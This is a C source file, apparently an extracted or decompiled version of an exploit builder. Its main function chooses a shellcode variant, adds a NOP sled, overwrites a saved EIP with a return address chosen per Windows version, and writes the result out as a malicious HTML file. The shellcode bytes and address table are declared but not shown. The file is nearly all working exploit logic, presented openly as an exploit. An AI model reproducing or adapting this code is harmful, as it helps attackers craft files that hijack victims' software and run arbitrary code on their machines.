
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


struct TYPE_4__ {char* shellname; int * shelltype; } ;
struct TYPE_3__ {char* windows; int eip; } ;


 int EIP_OFFSET ;
 int HTMLFILE ;
 int SHELL_OFFSET ;
 size_t T ;
 void* atoi (char*) ;
 int banner ;
 char* buffer ;
 int cpy (int ,char*) ;
 int * data ;
 int exit (int ) ;
 int fbuffer ;
 int fileBuild (int ,int) ;
 int getchar () ;
 int j ;
 int memcpy (int,int *,int) ;
 int memset (int,int,int) ;
 int print (char*) ;
 int printShell () ;
 int printTargets () ;
 int printf (char*,char*) ;
 int reverseInt (int ) ;
 TYPE_2__* shellc ;
 int strlen (int *) ;
 int system (char*) ;
 TYPE_1__* target ;

int main(int argc,char* argv[])
   {
       system("CLS");

       cpy(banner,buffer);
       printf("%s",buffer);

       print("Starting exploit...");

       printShell();
       printTargets();

       if (argc < 2)
       {
         print("Too few args");
         exit(0);
       }
         memcpy(fbuffer, data, strlen(data));
         j=atoi(argv[1]);

         switch(j)
         {
           case 0:
              memcpy(fbuffer+SHELL_OFFSET,shellc[0].shelltype,sizeof(shellc[0].shelltype));
              break;
           case 1:
              memcpy(fbuffer+SHELL_OFFSET,shellc[1].shelltype,sizeof(shellc[1].shelltype));
              break;
           case 2:
              memcpy(fbuffer+SHELL_OFFSET,shellc[2].shelltype,sizeof(shellc[2].shelltype));
              break;
           case 3:
              memcpy(fbuffer+SHELL_OFFSET,shellc[3].shelltype,sizeof(shellc[3].shelltype));
              memset(fbuffer+SHELL_OFFSET+strlen(shellc[3].shelltype),0x90,161);
              break;
           default: exit(0);
        }

        T=atoi(argv[2]);

        if (T==0)
        {
          reverseInt(target[T].eip);
          memcpy(fbuffer+EIP_OFFSET,&target[T].eip,4);}
              else
        if (T==1)
        {
          reverseInt(target[T].eip);
          memcpy(fbuffer+EIP_OFFSET,&target[T].eip,4);
        }
              else
        if (T==2)
        {
          reverseInt(target[T].eip);
          memcpy(fbuffer+EIP_OFFSET,&target[T].eip,4);
        }
              else
        if (T==3)
        {
          reverseInt(target[T].eip);
          memcpy(fbuffer+EIP_OFFSET,&target[T].eip,4);
        }
             else
        if (T==4)
        {
          reverseInt(target[T].eip);
          memcpy(fbuffer+EIP_OFFSET,&target[T].eip,4);
        }

        fileBuild(HTMLFILE,fbuffer);
        printf("You are using the %s ret address\n",target[T].windows);
        printf("You are using the %s shellcode\n",shellc[j].shellname);
        print("Building file");
        print("DONE! file is build");

        getchar();
        return 0;
   }
